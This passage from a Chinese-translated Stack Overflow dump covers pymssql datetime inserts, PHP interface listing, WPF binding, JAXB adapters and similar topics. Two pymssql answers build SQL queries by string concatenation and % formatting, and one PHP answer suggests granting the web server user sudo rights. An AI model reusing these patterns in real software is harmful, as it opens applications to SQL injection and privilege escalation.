> 时间：2013-04-10T21:30:15.830

可能这可以通过三个关键组件的任意组合进行查找。请注意，为简单起见，配对查找 (A+B) 的键是由简单的 concat 创建的。真正的键应该是元组。

```
var keys = new[] { new Key("a", "b", c"), ... };

class Map
{
  // ... skip members declaration here
  public Map(IEnumerable<Keys> keys)
  {
    all = keys;

    mapA = keys.ToLookup(k => k.A);
    mapB = keys.ToLookup(k => k.B);
    mapC = keys.ToLookup(k => k.C);

    // should be keys.ToLookup(k => Tuple.Create(k.A, k.B))
    mapAB = keys.ToLookup(k => k.A + k.B);
    mapAC = keys.ToLookup(k => k.A + k.C);
    mapBC = keys.ToLookup(k => k.B + k.C);

    mapABC = keys.ToLookup(k => k.A + k.B + k.C);
  }

  public IEnumerable<Key> Find(Key k)
  {
    if(k.A == null && k.B == null && k.C == null) return all;

    if(k.A != null && k.B == null && k.C == null) return mapA[k.A];
    if(k.A == null && k.B != null && k.C == null) return mapB[k.B];
    if(k.A == null && k.B == null && k.C != null) return mapC[k.C];

    if(k.A != null && k.B != null && k.C == null) return mapAB[k.A+k.B];
    if(k.A != null && k.B == null && k.C != null) return mapAC[k.A+k.C];
    if(k.A == null && k.B != null && k.C != null) return mapBC[k.B+k.C];

    return mapABC[k.A+k.B+k.C];
  }
} 
```

# python - 使用 pymssql 将 datetime 对象插入 SQL Server

> ID：15936340
> 
> 赞同：8
> 
> 时间：2013-04-10T21:02:46.747
> 
> 标签：python, sql-server, windows, pymssql

如何使用 pymssql 插入数据时间对象？我知道 SQL Server 表需要一个日期时间对象，假设在位置 3。我已经尝试了所有这三个：

```
cursor.execute("INSERT INTO MyTable VALUES(1, 'Having Trouble', datetime.datetime.now())")
cursor.execute("INSERT INTO MyTable VALUES(1, 'Having Trouble', 20130410)")
cursor.execute("INSERT INTO MyTable VALUES(1, 'Having Trouble', '20130410')")
cursor.execute("INSERT INTO MyTable VALUES(1, 'Having Trouble', GETDATE())") 
```

我每次都得到同样的错误：

```
OperationalError: (241, 'Conversion failed when converting date and/or time from character string.DB-Lib error message 241, severity 16:\nGeneral SQL Server error: Check messages from the SQL Server\n') 
```

我已经搜索了那里的小文档，并反复搜索。

**编辑：**次要问题是字段长度问题。请参阅有关已接受答案的第一条评论。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-10T21:05:38.267

您正在尝试插入一个未格式化为日期的字符串 (datetime.datetime.now(), 20130410, '20130410', GETDATE()) 所以 sql server 无法从中解析日期...

所以试试这个...

```
cursor.execute("
    INSERT INTO MyTable
    VALUES(
        1,
        'Having Trouble',
        '" + str(datetime.datetime.now()) + "'
    )
") 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-04-10T21:17:05.130

您可以使用以下代码：

```
# a tuple with the data to be stored in db
data = (1, 'Having Trouble', datetime.datetime.now())
# perform the query 
cursor.execute("INSERT INTO MyTable VALUES(%s, %s, %s)" % data) 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2014-03-10T19:46:52.350

试试这个：

```
timeStamp = str(datetime.datetime.now())[0:-3] 
```

这种时间戳格式可以通过 MS SQL SERVER 进行转换，并且可以在 pymssql 中用于插入 datetime 类型的对象

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-08-08T21:47:50.583

对于面临同样问题的其他人，我的问题是不同的。

我的年份被解析为 0014；我认为这被解释为 2014 年。我花了一段时间才意识到发生了什么。

pymssql 出现的地方是 smalldate 类型没有将 0014 识别为一年并且无法进行转换。

# php - 如何在php中获取活动网络接口的列表

> ID：15936344
> 
> 赞同：0
> 
> 时间：2013-04-10T21:02:57.007
> 
> 标签：php, sockets, network-programming, php-socket

所以我想要的是通过 php 独立使用套接字函数来实现这一点-

```
$  sudo ifconfig | cut -d " " -f1 | awk 'NF==1{print $1}'
 eth0
 lo
 wlan0 
```

我知道我可以通过使用命令来做到这一点，`system`但为此我需要更改粘性位权限`ifconfig (root privelaged command)`或需要编写 C 包装器。

所以请告诉我通过 PHP 实现这一目标的最佳方法。

我的目的是使用使用 HTML 和 PHP 开发的应用程序向前端用户显示可用的网络接口列表。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2019-01-08T06:28:51.147

在基于 Debian 的发行版上，您可以使用我编写的这个库。它可以读/写 /etc/network/interfaces

[https://github.com/carp3/networkinterfaces](https://github.com/carp3/networkinterfaces)

```
<?php
//include composer autoloader
include 'vendor/autoload.php';

// 'import' NetworkInterfaces class
use NetworkInterfaces\Adaptor;
use NetworkInterfaces\NetworkInterfaces;

// create new handle from /etc/networking/interfaces
$handle = new NetworkInterfaces('/etc/networking/interfaces');

// parse file
$handle->parse();

// print all adaptors
var_dump($handle->Adaptors); 
```

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2013-04-10T21:38:29.697

您可以将您的网络服务器运行为（通常是 www 或 www-data）的用户添加到`/etc/sudoers`. 然后您应该能够通过系统调用访问 ifconfig 命令。显然这里存在安全影响。如果您采用该路线，则应限制对 ifconfig 命令的访问。

```
$out = system("sudo ifconfig ..."); 
```

# wpf - 滑块和对象之间的简单数据绑定以更新 WPF 中的图形

> ID：15936350
> 
> 赞同：0
> 
> 时间：2013-04-10T21:03:08.123
> 
> 标签：wpf, xaml, data-binding

我特别需要`System.Drawing.Graphics`用作 Image 控件的 ImageSource。该图形将由滑块更新，其值将数据绑定到充当模型以构建图形的对象。

我已经建立了我想要完成的最小工作版本，并尽可能多地创建了“绑定基础结构”，但已经停止了事情开始让我感到困惑的地方。我的代码只有 MainWindow（XAML 和后面的代码）和一个 Radius 类：

主窗口：

```
<Window x:Class="MinimalUpdateableDrawing.MainWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="MainWindow"
        WindowState="Maximized">
    <DockPanel>
        <Slider x:Name="SizeSlider"  DockPanel.Dock="Bottom" />
        <Image x:Name="figure" Width="800" Height="600" />
    </DockPanel>
</Window> 
```

MainWindow 代码隐藏：

```
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows;
using System.Windows.Media.Imaging;

namespace MinimalUpdateableDrawing {
    public partial class MainWindow : Window {

        Radius radius_instance;

        public MainWindow() {
            InitializeComponent();

            radius_instance = new Radius();

            this.Loaded +=new RoutedEventHandler(DrawCircle);
        }

        void DrawCircle(object sender, RoutedEventArgs e) {

            int radius = radius_instance.Value;

            using (var bmp = new Bitmap((int)figure.Width, (int)figure.Height)) {
                using (var g = Graphics.FromImage(bmp)) {
                    g.FillEllipse(System.Drawing.Brushes.Blue,
                                  (int)figure.Width/2-radius,
                                  (int)figure.Height/2-radius,
                                  radius*2, radius*2);
                }

                using(MemoryStream ms = new MemoryStream()) {
                    bmp.Save(ms, ImageFormat.Bmp);
                    ms.Position = 0;
                    BitmapImage bitmapImage = new BitmapImage();
                    bitmapImage.BeginInit();
                    bitmapImage.StreamSource = ms;
                    bitmapImage.CacheOption = BitmapCacheOption.OnLoad;
                    bitmapImage.EndInit();
                    figure.Source = bitmapImage;
                }
            }
        }
    }
} 
```

半径类：

```
using System;
using System.ComponentModel;

namespace MinimalUpdateableDrawing
{
    class Radius : INotifyPropertyChanged {

        int _value = 100;

        public int Value {
            get { return _value; }
            set {
                _value = value;
                OnPropertyChanged("Value");
            }
        }

        public event PropertyChangedEventHandler PropertyChanged;
        private void OnPropertyChanged(string p) {
            throw new NotImplementedException();
        }

    }
} 
```

如果有人能建议我应该做些什么来实现和之间的绑定`SizeSlider`，`radius_instance.Value`那么当我移动滑块时图像会更新，那会让我继续前进！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-11T00:36:52.440

如果您只是绘制一个椭圆，我建议将滑块的值和 Ellipse 对象绑定到存储相关值的对象。[您可以在http://msdn.microsoft.com/en-us/library/ms747393.aspx](http://msdn.microsoft.com/en-us/library/ms747393.aspx)上查看有关使用 Wpf 绘图的更多信息。

```
<Grid>
    <Grid.RowDefinitions>
        <RowDefinition />
        <RowDefinition Height="Auto" />
    </Grid.RowDefinitions>

    <Ellipse Height="{Binding Radius}" Width="{Binding Radius}" HorizontalAlignment="Center" VerticalAlignment="Center" Fill="Black" />
    <Slider Value="{Binding Radius}" Grid.Row="1" Minimum="0" Maximum="200" />
</Grid> 
```

话虽如此，如果绘图更复杂，您可能需要考虑使用 IValueConverter 将值调整为您可以使用的绘图......例如：

```
<Window x:Class="WpfApplication1.MainWindow"
            xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
            xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
            xmlns:local="clr-namespace:WpfApplication1"
            Title="MainWindow" Height="350" Width="525">
    <Window.Resources>
        <local:EllipseConverter x:Key="EllipseConverter" />
    </Window.Resources>
    <Grid>
        <Grid.RowDefinitions>
            <RowDefinition />
            <RowDefinition Height="Auto" />
        </Grid.RowDefinitions>

        <Image Source="{Binding Radius, Converter={StaticResource EllipseConverter}}" HorizontalAlignment="Center" VerticalAlignment="Center" Stretch="None" />
        <Slider Value="{Binding Radius}" Grid.Row="1" Minimum="0" Maximum="200" />
    </Grid>
</Window> 
```

值转换器：

```
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Data;
using System.Windows.Media.Imaging;

namespace WpfApplication1
{
    class EllipseConverter : IValueConverter
    {
        public object Convert(object value, Type targetType, object parameter, System.Globalization.CultureInfo culture)
        {
            if (value == null) return null;

            int radius = (int)value;
            int diameter = radius * 2;

            using (var bmp = new System.Drawing.Bitmap(diameter, diameter))
            {
                using (var g = Graphics.FromImage(bmp))
                {
                    g.FillEllipse(System.Drawing.Brushes.Blue,
                                  0,
                                  0,
                                  diameter,
                                  diameter);
                }

                using (MemoryStream ms = new MemoryStream())
                {
                    bmp.Save(ms, ImageFormat.Bmp);
                    ms.Position = 0;
                    BitmapImage bitmapImage = new BitmapImage();
                    bitmapImage.BeginInit();
                    bitmapImage.StreamSource = ms;
                    bitmapImage.CacheOption = BitmapCacheOption.OnLoad;
                    bitmapImage.EndInit();

                    return bitmapImage;
                }
            }
        }

        public object ConvertBack(object value, Type targetType, object parameter, System.Globalization.CultureInfo culture)
        {
            throw new NotImplementedException();
        }
    }
} 
```

# c# - 为什么我不能访问静态类中的公共属性字段

> ID：15936355
> 
> 赞同：1
> 
> 时间：2013-04-10T21:03:38.320
> 
> 标签：c#, .net, enums, static-classes

我试图弄清楚为什么这不起作用......

```
public static class ApplicationType
{
    private static ApplicationEnum application = ApplicationEnum.App1; 
    public static ApplicationEnum Application
    {
        get { return application; }
        set { application = value; }
    }

    public enum ApplicationEnum
    {
        App1,
        App2,
        App3
    }
} 
```

我想`Application`从另一个类访问，例如...

```
public partial class MainWindow : Window
{
    ApplicationType.   //<-- Intellisense shows only ApplicationEnum    } 
```

谢谢。

编辑：问题是我没有像我想的那样在这个例子中尝试在 MainWindow 内。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-10T21:06:58.957

您正处于类声明的中间。您需要声明一个字段、方法等。例如，这应该没问题（如果您`ApplicationEnum`公开）：

```
private ApplicationEnum foo = ApplicatoinType.Application; 
```

在你`ApplicationEnum`公开之前，你会发现你的`Application`属性将无法编译——你不能声明一个本身不是公共的类型的公共属性。

# sql-server - 棒球 XML 到 SQL 查询 - 优化

> ID：15936356
> 
> 赞同：0
> 
> 时间：2013-04-10T21:03:46.853
> 
> 标签：sql-server, xml

源数据看起来来自以下描述美国职业棒球大联盟比赛的免费 XML 文件。

[http://gd2.mlb.com/components/game/mlb/year_2013/month_04/day_09/gid_2013_04_09_atlmlb_miamlb_1/inning/](http://gd2.mlb.com/components/game/mlb/year_2013/month_04/day_09/gid_2013_04_09_atlmlb_miamlb_1/inning/)

我创建了一个 SQL Server 表，其中包含每个 GamePK/局的一行，以及一个名为 PBP 的 XML 列。上面文件夹中的每个文件都成为此表中的一行。下面的查询是我尝试将 XML 解析为记录集。它可以工作，但对于大量行来说非常慢，而且非常重复 - 似乎应该有更好的方法来做到这一点而没有 UNION 子句。感谢您对改进/优化的任何帮助

```
select 
 i.GamePK
 ,inn.value('@num', 'int') as inning
 ,itop.value('1', 'int') as IsTop
 ,itop.value('@num', 'int') as abNum
 ,itop.value('@batter', 'int') as batter
--  clip

 ,itoppit.value('@des', 'varchar(32)') as pitdesc
 ,itoppit.value('@id', 'int') as seq
 ,itoppit.value('@type', 'varchar(8)') as pittype
-- clip 

 from tblInnings i
       cross apply PBP.nodes('/inning') as inn(inn)
       cross apply inn.nodes('top/atbat') as itop(itop)
       cross apply itop.nodes('pitch') as itoppit(itoppit)
union 
select 
 i.GamePK
 ,inn.value('@num', 'int') as inning
 ,ibot.value('0', 'int') as IsTop
 ,ibot.value('@num', 'int') as abNum
 ,ibot.value('@batter', 'int') as batter
-- clip 

 ,ibotpit.value('@des', 'varchar(32)') as pitdesc
 ,ibotpit.value('@id', 'int') as seq
 ,ibotpit.value('@type', 'varchar(8)') as pittype
--clip

 from tblInnings i
       cross apply PBP.nodes('/inning') as inn(inn)
       cross apply inn.nodes('bottom/atbat') as ibot(ibot)
       cross apply ibot.nodes('pitch') as ibotpit(ibotpit) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T23:37:25.117

如果您使用的是最新版本的 SQL Server，则有一种新的列数据类型 (XML)。

您可以对其应用 xpath，从而更轻松地查询该列。

我建议您将其实际存储为 XML，并将其视为 XML，而不是尝试将 XML 作为字符串存储在您的数据库中。

有一个学习曲线。您需要熟悉 XPATH，但这不是火箭科学。

一个例子：

```
SELECT Id, PartitionMonth, EmailAddress, AcquisitionCodeId, FieldValues.value('
declare namespace s="http://domain.com/FieldValues.xsd";
data(/s:FieldValues/s:item/@value)[1]', 'varchar(200)')
FROM Leads.Leads WITH (NOLOCK)
 WHERE Id = 190708 
```

另一个按键检索值的示例：

```
SELECT r.EmailAddress, ar.Ip, ar.DateLog, 
  ar.FieldValues.value('
  declare namespace s="http://domain.com/FieldValues.xsd";
  data(/s:FieldValues/s:item[@key="First Name"]/@value)[1]', 'varchar(20)') FirstName,
  ar.FieldValues.value('
  declare namespace s="http://domain.com/FieldValues.xsd";
  data(/s:FieldValues/s:item[@key="Last Name"]/@value)[1]', 'varchar(20)') LastName
FROM Records.Records r WITH (NOLOCK)
JOIN Records.AcquisitionRecords ar WITH (NOLOCK) ON r.Id = ar.Id
WHERE ar.AcquisitionCodeId IN (19, 21, 30, 34, 36)
AND ar.DateLog BETWEEN '1-mar-09' AND '31-mar-09' 
```

在 SQL Server 中开始使用 XML 的好地方 [http://msdn.microsoft.com/en-US/library/ms189887(v=sql.90).aspx](http://msdn.microsoft.com/en-US/library/ms189887(v=sql.90).aspx)

# c++ - 无法理解为什么我的窗口大小数学不适用于某些特定的编译器和操作系统

> ID：15936363
> 
> 赞同：3
> 
> 时间：2013-04-10T21:04:00.197
> 
> 标签：c++, c, windows, visual-studio, winapi

我曾经执行以下操作来创建一个 800*600 客户区的窗口：

```
dwStyle = WS_OVERLAPPED | WS_THICKFRAME | WS_BORDER | WS_DLGFRAME | WS_SYSMENU | WS_MINIMIZEBOX;
int nPositionX = 20, nPositionY = 20;
hWindowHandle = CreateWindow(   L"CGFramework", wszWndCaption, 
                        dwStyle, nPositionX, nPositionY, 
                        800 + GetSystemMetrics( SM_CXSIZEFRAME )*2, 
                        600 + GetSystemMetrics( SM_CYSIZEFRAME )*2
                        + GetSystemMetrics( SM_CYCAPTION ),
                        0, 0, hInstance, 0
                    ); 
```

然后当用GetClientRect查询客户端矩形时，我以前得到800*600，但现在我将我的Visual Studio 2008项目升级到VS2012，现在GetClientRect()函数返回792*592。这只会发生在催吐 Aero 主题而不是 Classic Windows 主题中。

最重要的是，正在创建的窗口的实际大小是 804*629，我认为这是没有原因的，因为可调整大小的框架（来自 WS_THICKFRAME）明显大于每边 2 个像素。

所以我的问题如下：

*   为什么 800 + GetSystemMetrics( SM_CXSIZEFRAME )*2 不产生窗口宽度？除了普通的窗口边框和客户区之外，我什么也没看到。
*   为什么 800 + GetSystemMetrics( SM_CXSIZEFRAME )*2 是 804？你有没有看到默认为 2 像素宽的 WS_THICKFRAME 边框？不管我们说什么主题，这个结果都是错误的，没有这样的 2px 边框。我得到的真正边框大约是 5 或 6 px 宽，这增加了这些值的无意义。
*   为什么这只发生在 VS2012 而不是其他编译器版本？
*   为什么在 windows 7 aero 和 windows 8 aero 中会发生不同的情况？两个操作系统的行为不应该相同吗？相同的可执行文件将与 W7 中的经典主题完美配合，在 W7 Aero 中会产生错误的大小，并且会在 W8 中完全破坏我的窗口内容——可能是因为我正在使用 WinAPI 函数来创建适当的 D3D 后台缓冲区。出于某种原因，如果应用程序使用旧版本的编译器（例如 VS 2008）编译，它将在 W7 Aero 和 W8 中正常工作。

我不介意是否可以通过其他方式获得合适的窗口大小；我只是想知道为什么过去 15 年左右有效的通用程序不再起作用了。如果您的答案只是“使用 AdjustWindowRect”，那么请不要回答，因为我在这里问的是不同的东西。我什至可能无法使用该功能，所以我想知道为什么我得到的损坏的数字一定是这样的。

我认为函数 GetSystemMetrics() 实际上是返回边界边界的大小，因为我认为它们是唯一可以测量 2 个像素的东西（实际上它们在边界的每一侧都是 1 个像素..它对我来说仍然没有任何意义）

PS：在项目配置中更改 DPI Awareness 没有任何区别。

# javascript - 需要从谷歌电子表格获取数据到 javascript 以绑定到按钮

> ID：15936365
> 
> 赞同：0
> 
> 时间：2013-04-10T21:04:15.457
> 
> 标签：javascript, json, google-sheets

我对 javascript 很陌生...我正在尝试从 Google 电子表格中的单元格中获取一个 url，我希望该 url 然后绑定到我网站上的一个按钮...（请参阅下面的 html 中的按钮）

```
"<center><FORM METHOD="LINK" ACTION= X
<INPUT TYPE="submit" VALUE="Clickable Button">
</FORM> </center>" 
```

我也想要 X 变量 = url 包含在 Google 电子表格的特定单元格中。我一直在寻找几天来完成这个，我知道我需要使用一些 javascript 但不知道如何实现它。请帮忙。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-13T01:23:25.383

实现此目的的一种方法是使用[本页记录的 Google JSON API 方法](https://developers.google.com/gdata/samples/spreadsheet_sample)。

您首先将一个 javascript 文件添加到您的页面，如下例所示。

```
<script src="http://spreadsheets.google.com/feeds/list/*ID*/*WS*/public/values?alt=json-in-script&amp;callback=*FN*"></script> 
```

• 其中*** *ID* ***是电子表格的长ID。

• 其中*** *WS* ***是工作表编号，例如 1、2、3 等。

• 其中*** *FN* ***是您要调用的函数。

然后在回调函数中，您可以执行以下操作以根据需要添加变量。**rowWithURL**是行号。**CellWIthURL**通常是列标题。或者您可以使用其他一些方法来定位您的 URL。

```
function CallBack(json){
   entry = json.feed.entry[rowWithURL];
   url = entry.gsx$CellWithURL.$t;

   content = '<center>' + 
                 '<form method="link" action='+ url +'>' + 
                     '<input type="submit" value="Clickable Button">' +
                 '</form>' +
             '</center>'
} 
```

请注意，上述内容未经测试，但应该让您走上正轨。

# maven - 为什么 maven-resources-plugin 不复制图像文件？

> ID：15936366
> 
> 赞同：1
> 
> 时间：2013-04-10T21:04:16.410
> 
> 标签：maven, maven-resources-plugin

我正在使用 YUICompressor maven 插件缩小和聚合我的 css 文件，该插件在我的资源目录的基础上创建了一个 css 文件。这些原始 css 文件嵌套在一些文件夹中，这些文件夹在同一级别也有一个“图像”文件夹。

我想将这些嵌套图像文件夹中的所有图像复制到我的资源目录底部的一个“图像”文件夹中，以便聚合的 css 仍然能够引用这些图像。

这是我的插件配置：

```
<plugin>
    <artifactId>maven-resources-plugin</artifactId>
    <version>2.6</version>
    <executions>
        <execution>
            <id>copy-images-for-css</id>
            <!-- here the phase you need -->
            <phase>process-resources</phase>
            <goals>
                <goal>copy-resources</goal>
            </goals>
            <configuration>
                <outputDirectory>target/${project.artifactId}-${project.version}/plugin/resources/${plugin.client.version}/images</outputDirectory>
                <resources>
                    <resource>
                        <directory>target/${project.artifactId}-${project.version}/plugin/resources/${plugin.client.version}</directory>
                        <includes>
                            <include>**/images/*.*</include>
                        </includes>
                    </resource>
                </resources>
            </configuration>
        </execution>
    </executions>
</plugin> 
```

为了测试这一点，我在嵌套图像文件中放置了一个 .js 文件，旁边是我希望复制的 .gif 和 .jpg 文件。但是，只有 .js 文件被移动到正确的位置；图像文件没有任何反应。

是什么赋予了？

**更新 1：**

更直观的目录结构描述：

```
resources
|--1.1.0
   |--all.min.css
   |--images          //a newly created folder
      |--sample1.gif   //the copied file
      |--sample2.gif   //the copied file
   |--category
      |--category.css
      |--images
         |--sample1.gif
   |--otherCategory
      |--otherCategory.css
      |--images
         |--sample2.gif 
```

**更新 2：** 我刚刚尝试使用[copy-maven-plugin](http://evgeny-goldin.com/wiki/Copy-maven-plugin)执行复制并得到相同的结果，js 文件被复制但不是图像文件。不确定这些插件是否共享功能，但如果不是，它让我认为存在与插件无关的事情。我能够使用 Windows 命令提示符成功复制文件。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-11T11:32:25.690

尝试替换`<include>**/images/*.*</include>`为 `<include>**/images/*</include>`. 但是很奇怪为什么它不适用于您的变体。同样对于您的情况，最好使用[程序集](http://maven.apache.org/plugins/maven-assembly-plugin/)插件

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-11T16:24:50.180

我不确定将资源复制到目标目录的时间，但似乎图像根本没有及时复制。我意识到没有真正的理由需要从目标目录而不是我的源目录进行复制。我更新了目录，如下所示，图像已成功复制。

前：

```
<directory>target/${project.artifactId}-${project.version}/plugin/resources/${plugin.client.version}</directory> 
```

后：

```
<directory>src/main/webapp/plugin/resources/${plugin.client.version}</directory> 
```

# c++ - 在这种情况下我应该使用什么智能指针？

> ID：15936367
> 
> 赞同：1
> 
> 时间：2013-04-10T21:04:13.803
> 
> 标签：c++, boost, smart-pointers

我有一个类，`ResourceManifest`它从文件中加载 3d 模型并将它们保存在向量中，然后按要求分发它们。也可以从存储中删除缓存的 3dmodel，我希望我的其他组件在发生这种情况时能意识到这一点。这是我现在拥有的，但它不能满足我对属于`ResourceManifest`该类的唯一所有权的意图

```
 typedef boost::shared_ptr<Model> ModelPtr;

    class ResourceManifest
    {
    public:
        ResourceManifest(IRenderer& renderer);
        ~ResourceManifest();

        ModelPtr LoadModel(const std::string& modelName, const std::string& assetName);
        ModelPtr GetModel(const std::string& modelName);
        void DeleteModel(ModelPtr model);

    private:
        IRenderer& mRenderer;
        std::vector<ModelPtr> mModels;
        IMemoryAllocator& mMemoryAllocator;
    }; 
```

在我的第一次尝试中，我将其保留`Model`为 shared_ptrs; 但结果是，正如暗示的那样，它是共享所有权，我只希望位于向量内的副本`ResourceManifest`成为所有者。我想要一个智能指针的原因只是为了能够查询它是否`Model`仍然存在，这是我不能用原始指针做的事情。

我知道weak_ptr，但如果可能的话，我宁愿避免使用它的语法；如果可能的话，我想像普通指针一样使用它，就像这样......

```
ModelPtr modelCube = resourceManifest.GetModel("Cube");

...... later on

if (modelCube)
    modelCube->render(); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T21:47:09.320

解决您的问题的一种解决方案是使用weak_ptr，但据我了解您的问题，您不喜欢它的语法。ResourceManifest::GetModel 将返回一个weak_ptr，您必须使用 .lock() 才能将 shared_ptr 传递给模型，如果 .lock() 成功，则会产生一个您可以使用的有效 shared_ptr。

您在问题中没有提到的 shared_ptr/weak_ptr 方法的另一个问题是，ResourceManifest 不会真正成为模型的所有者，即使它只分发weak_ptr 之外的任何东西。我的意思是，没有什么可以阻止 ResourceManifest 的用户将weak_ptr 提升到shared_ptr 并保留shared_ptr，从而使其存活时间超过ResourceManifest 想要的时间。简而言之，ResourceManifest 失去了对模型生命周期的控制。

你可以做的是发明你自己的智能指针，它只保留原始指针：

```
MySmartPtr model = manifest.GetModel("foobar"); 
```

如果原始指针有效，则执行布尔测试：

```
if (model) 
```

例如，您的智能指针可以询问 ResourceManifest 指针是否有效。如果指针有效，用户可以通过智能指针的取消引用运算符使用指针：

```
 model->render(); 
```

但是这里有一个问题：如果要从多个线程中使用您的智能指针和 ResourceManifest，您的

```
if (model)
  model->render(); 
```

成为竞争条件，但是由于您的问题没有提到多个线程，因此我不会为此提供答案...

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-10T21:27:28.310

您可以为`weak_ptr`. 这是一个简单的，未完成的，可以帮助您入门。

```
template<typename T>
class weak_ptr2
{
public:
    weak_ptr2(std::shared_ptr<T> const & sp)
        :wp(sp)
    {}

    T & operator*() const { return *(wp.lock()); }
    T * operator->() const { return wp.lock().get(); }
    explicit operator bool() const { return !wp.expired(); }
private:
    std::weak_ptr<T> wp;
}; 
```

# java - JAXB 绑定文件将 @XmlElement 类型设置为 String 而不是 XMLGregorianCalendar

> ID：15936368
> 
> 赞同：19
> 
> 时间：2013-04-10T21:04:19.997
> 
> 标签：java, xml, generics, jaxb

我正在尝试创建一个`XmlAdapter`接收`XMLGregorianCalendar`并输出一个`XMLGregorianCalendar`. 目的只是在解组数据时从元素中删除时区数据。

它看起来像这样：

```
public class TimezoneRemoverAdapter extends XmlAdapter<XMLGregorianCalendar, XMLGregorianCalendar> {
    public XMLGregorianCalendar unmarshal(XMLGregorianCalendar xgc) {
        if(xgc == null) {
            return null;
        }
        xgc.setTimezone(DatatypeConstants.FIELD_UNDEFINED);
        return xgc;
    }

    public XMLGregorianCalendar marshal(XMLGregorianCalendar xgc) {
        return xgc;
    }
} 
```

这适用于以下代码：

```
public class FooElement {
    @XmlElement(name="bar-date")
    @XmlJavaTypeAdapter(TimezoneRemoverAdapter.class)
    @XmlSchemaType(name = "date")
    protected XMLGregorianCalendar barDate;
} 
```

不幸的是，当我使用`jaxb-bindings.xml`文件生成代码时，上面的代码如下所示：

```
public class FooElement {
    @XmlElement(name="bar-date", type=java.lang.String.class)
    @XmlJavaTypeAdapter(TimezoneRemoverAdapter.class)
    @XmlSchemaType(name = "date")
    protected XMLGregorianCalendar barDate;
} 
```

它将类型设置为`String`，所以我上面的方法不起作用。类型`String`设置覆盖了`XMLGregorianCalendar`它应该是的类型。我可以手动更改它，但我宁愿不必记住每次重新生成 jaxb 文件时都更新它。有谁知道是否有手动设置`@XmlElement`类型或忽略它的选项？

这是`jaxb-bindings.xml`文件的相关部分：

```
<jxb:bindings node=".//xs:element[@name=bar-date]">
    <jxb:property>
        <jxb:baseType>
            <jxb:javaType name="javax.xml.datatype.XMLGregorianCalendar" adapter="foo.bar.TimezoneRemoverAdapter" />
        </jxb:baseType>
    </jxb:property>
</jxb:bindings> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-12-16T10:05:36.420

## 更新

总结：

1.  您有一个在某处使用日期样式的架构，并且您无法更改架构
2.  您有一些使用该模式的 XML 数据并指定了一些带有时区的日期（所以它的`yyyy-MM-ddXXX`格式）
3.  您想从该文件中的日期**表示**`XXX`中删除该部分（日期本身不提供任何时区，日期只是一个数字）

 **所以这可能是一个示例模式：

```
<?xml version="1.0" encoding="UTF-8"?>
<schema xmlns="http://www.w3.org/2001/XMLSchema" elementFormDefault="qualified">
    <element name="foo">
        <complexType>
            <sequence>
                <element name="bar" type="date" minOccurs="1" maxOccurs="1"/>
            </sequence>
        </complexType>
    </element>
</schema> 
```

这可能是一个样本数据：

```
<?xml version="1.0" encoding="UTF-8"?>
<foo xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="foo.xsd">
    <bar>2014-01-01+06:00</bar>
</foo> 
```

这是 JAXB 注释类

```
@XmlRootElement
@XmlAccessorType(XmlAccessType.FIELD)
public class Foo implements Serializable
{
    private static final long serialVersionUID = 1L;

    @XmlElement(name = "bar")
    @XmlJavaTypeAdapter(DateAdapter.class)
    @XmlSchemaType(name = "date")
    private Date bar;

    // getters/setters
} 
```

这是日期适配器

```
public class DateAdapter extends XmlAdapter<String, Date>
{
    @Override
    public String marshal(Date date)
    {
        DateFormat df = new SimpleDateFormat("yyyy-MM-dd");
        df.setTimeZone(TimeZone.getTimeZone("GMT"));
        return df.format(date);
    }

    @Override
    public Date unmarshal(String date) throws ParseException
    {
        DateFormat df = new SimpleDateFormat("yyyy-MM-ddXXX");
        return df.parse(date);
    }
} 
```

这是主要的，针对架构进行验证：

```
public static void main(String[] args) throws JAXBException, SAXException
{
    JAXBContext context = JAXBContext.newInstance(Foo.class);

    SchemaFactory sf = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);
    Schema schema = sf.newSchema(Foo.class.getResource("/foo.xsd"));

    Unmarshaller unmarshaller = context.createUnmarshaller();
    unmarshaller.setSchema(schema);
    Foo foo = (Foo) unmarshaller.unmarshal(Foo.class.getResource("/foo.xml"));
    System.out.println("unmarshalled: " + foo.getBar());

    Marshaller marshaller = context.createMarshaller();
    marshaller.setProperty(Marshaller.JAXB_FORMATTED_OUTPUT, true);
    marshaller.setProperty(Marshaller.JAXB_NO_NAMESPACE_SCHEMA_LOCATION, "foo.xsd");
    marshaller.setSchema(schema);
    marshaller.marshal(foo, System.out);
} 
```

这是输出，时区已被删除，日期表示已明显改变

```
unmarshalled: Tue Dec 31 19:00:00 CET 2013
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<foo xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="foo.xsd">
    <bar>2013-12-31</bar>
</foo> 
```

也许这个日期表示的变化不是你所期望的，但这不是 JAXB 的问题，表示的日期没有改变。

我忘记了反向生成 Foo 的绑定：

```
<jaxb:bindings xmlns:jaxb="http://java.sun.com/xml/ns/jaxb" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xjc="http://java.sun.com/xml/ns/jaxb/xjc" jaxb:extensionBindingPrefixes="xjc" jaxb:version="2.0">
